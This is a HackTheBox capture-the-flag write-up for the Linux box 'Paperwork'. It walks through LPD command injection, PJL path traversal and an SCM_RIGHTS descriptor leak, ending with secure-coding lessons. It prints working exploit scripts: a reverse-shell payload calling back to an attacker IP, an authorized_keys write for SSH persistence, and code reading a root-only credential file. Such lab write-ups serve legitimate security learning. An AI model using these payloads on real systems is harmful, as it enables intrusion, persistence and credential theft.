# Paperwork — HackTheBox Writeup
**Difficulty:** Easy | **OS:** Linux

---

## Overview

Paperwork is an Easy Linux box built entirely around custom printer/spooler protocol implementations — no CVEs, no public exploits. Every step requires reading exposed source code and reasoning about the protocol directly. The chain hits three distinct bugs: LPD command injection for initial access, PJL path traversal for arbitrary file read/write, and a Unix-socket file-descriptor leak via `SCM_RIGHTS` for privilege escalation to root.

**Target:** paperwork.htb

---

## Recon

```bash
nmap -sC -sV -p22,80,1515 -T4 -oN paperwork-scan.txt paperwork.htb
```

| Port | Service |
|------|---------|
| 22 | OpenSSH 10.0p2 Ubuntu |
| 80 | nginx 1.28.0 — "Intranet \| Document Archiving Service" |
| 1515 | Custom LPD-like service, self-identifying as `Archive_Printer` |

Port 1515 is unrecognised by nmap's service DB. The web root exposed a downloadable source archive `paperwork-archive-v1.02.zip` containing the LPD service's own source — a strong hint that source review, not blind exploitation, was the intended path.

---

## Foothold — LPD Command Injection

### The vulnerable code

`server.py` implements a minimal LPD (Line Printer Daemon) protocol handler. The relevant section:

```python
def handle_print_job(self, data):
    queue = data[1:].decode().strip()
    if queue not in VALID_QUEUE:
        self.sock.send(b'\x01')
        return
    while True:
        chunk = self.sock.recv(1024)
        subcommand = chunk[0]
        self.sock.send(b'\x00')
        parts = chunk[1:].decode(errors='ignore').split()
        size = int(parts[0])
        content = b""
        while len(content) < size:
            content += self.sock.recv(size - len(content) + 1)

        decoded_content = content.decode(errors='ignore')
        job_name = "Unknown"
        for line in decoded_content.split('\n'):
            line = line.strip()
            if line.startswith('J'):
                job_name = line[1:]
                break

        subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

`job_name` is taken verbatim from a `J`-prefixed line in the LPD control file and interpolated directly into a `shell=True` subprocess call inside single quotes. A single-quote breakout achieves full command injection:

```
J x'; <command>; echo '
```

### Protocol framing

The server expects:

1. `\x02<queue_name>\n` — "receive a print job" command
2. `<subcommand_byte><size> <filename>\n` — subcommand header
3. After server acks with `\x00` — exactly `size` bytes of control-file content plus one trailing NUL byte

### Exploit

Build the control file with a malicious job name and send it via raw socket:

```python
import socket

HOST = 'paperwork.htb'
PORT = 1515
QUEUE = 'archive'
ATTACKER_IP = '<YOUR_IP>'

payload = f"x'; bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1'; echo '"

control_file = f"H paperwork\nP hacker\nJ {payload}\n".encode()
size = len(control_file)

s = socket.socket()
s.connect((HOST, PORT))

# Step 1: Send queue name
s.send(b'\x02' + QUEUE.encode() + b'\n')
s.recv(1)

# Step 2: Send subcommand header (subcommand 2 = control file)
header = f'\x02{size} controlfile\n'.encode()
s.send(header)
s.recv(1)

# Step 3: Send control file + trailing NUL
s.send(control_file + b'\x00')
s.recv(1)
s.close()
```

Catch on port 4444 — shell as `lp`.

```bash
nc -lvnp 4444
# lp@paperwork:/opt/LPDServer$ id
# uid=7(lp) gid=7(lp) groups=7(lp)
```

---

## Lateral Movement — PJL Path Traversal → archivist

### Discovery

From the `lp` shell, a second service is bound to loopback:

```bash
ss -tlnp
# LISTEN 0 100 127.0.0.1:9100
```

```bash
find / -iname "*jetdirect*" 2>/dev/null
```

Finds a systemd unit running as `archivist`:

```ini
[Service]
User=archivist
WorkingDirectory=/home/archivist/printer/
ExecStart=/usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
```

A PJL (Printer Job Language) service on `127.0.0.1:9100`, reachable from the `lp` shell.

### The vulnerable code

`jetdirect.py`'s path translation:

```python
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))
```

`_translate()` strips the `0:` volume prefix and swaps backslashes for forward slashes — but `os.path.normpath(os.path.join(...))` happily resolves `../../../etc/passwd` straight out of the intended root. No containment check after normalization. Both `FSUPLOAD` (read) and `FSDOWNLOAD` (write) route through this, giving arbitrary file read/write as `archivist`.

### Exploit

Confirm with a read of `/etc/passwd`:

```
@PJL FSUPLOAD NAME="0:\..\..\..\etc\passwd" OFFSET=0 SIZE=2000
```

Full passwd file returned. Then write an SSH public key directly into archivist's authorized_keys:

```python
import socket

s = socket.socket()
s.connect(('127.0.0.1', 9100))

pubkey = open('/tmp/attacker.pub', 'rb').read()
path = r"0:\..\..\..\..\..\..\..\..\home\archivist\.ssh\authorized_keys"
cmd = f'@PJL FSDOWNLOAD NAME="{path}" SIZE={len(pubkey)}\r\n'.encode()
s.send(cmd + pubkey)
s.close()
```

```bash
ssh -i /tmp/attacker archivist@paperwork.htb
cat ~/user.txt
```

---

## Privilege Escalation — SCM_RIGHTS File Descriptor Leak

### Discovery

A daemon running as root listens on a Unix socket:

```bash
ls -la /run/paperwork/mgmt.sock
# srw-rw---- 1 root archivist 0 ... /run/paperwork/mgmt.sock
```

Owned `root:archivist` — reachable now that we're `archivist`. `/etc/paperwork/admin_pins.conf` is `-rw-------` root-only so direct reads are blocked. But the daemon opens it at startup and keeps that file descriptor alive.

### The bug

The daemon watches `/home/archivist/printer/logs/commands.log` (writable by `archivist`) for `FSQUERY`, `FSUPLOAD`, or `FSDOWNLOAD`. When a client connects to `mgmt.sock` after one of those strings appears in the log, the daemon sends **both** its own log file descriptor **and** the root-owned `admin_pins.conf` file descriptor to the client via `SCM_RIGHTS` ancillary data — a legitimate Unix mechanism for passing open file descriptors between processes, here triggered by an insufficiently-scoped log check rather than any real authentication.

### Exploit

```bash
# Step 1: Satisfy the trigger condition
echo "FSUPLOAD" >> /home/archivist/printer/logs/commands.log
```

```python
# Step 2: Connect and receive the leaked fds
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
s.send(b"\n")

fds = array.array("i")
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(2 * fds.itemsize))

for level, type_, data in ancdata:
    if level == socket.SOL_SOCKET and type_ == socket.SCM_RIGHTS:
        fds.frombytes(data[: len(data) - (len(data) % fds.itemsize)])

for fd in fds:
    print(os.pread(fd, 4096, 0).decode(errors='ignore'))
```

`os.pread()` on the leaked fd reads the file content directly through the kernel's open-file-description — bypassing on-disk permissions entirely, since permission checks happen at `open()` time, not at `read()` time, and the daemon already held the fd open as root.

Output: contents of `admin_pins.conf`, containing the admin password. Valid directly for `root` via `su -`:

```bash
su -
# Password: <from admin_pins.conf>
cat /root/root.txt
```

---

## Things I Learned

**Source review over tool spray.** The box handed out the server source in a zip on the web. Every step came from reading the code — there was nothing to google, no CVE to search, no metasploit module. The LPD injection, the path traversal, and the fd leak all required understanding exactly how untrusted input flowed into shell execution, path construction, or privileged IPC.

**`shell=True` with string interpolation is always injectable.** The moment you see `subprocess.Popen(f"...{user_input}...", shell=True)`, assume injection. Single-quote escaping in bash is not a sanitisation strategy.

**`os.path.normpath` does not sandbox paths.** It resolves `..` components but doesn't verify the result stays inside any intended root. Always compare the normalized path against the root after normalization: `if not result.startswith(root): raise`.

**`SCM_RIGHTS` is a real privesc primitive.** File descriptors can be passed between processes over Unix sockets. If a privileged daemon holds an fd open to a root-owned file and sends it to a lower-privileged client, that client can read the file regardless of its on-disk permissions. The check happens at `open()`, not at `read()`.

---

*Pexpo | HTB | 14 Jul 2026*
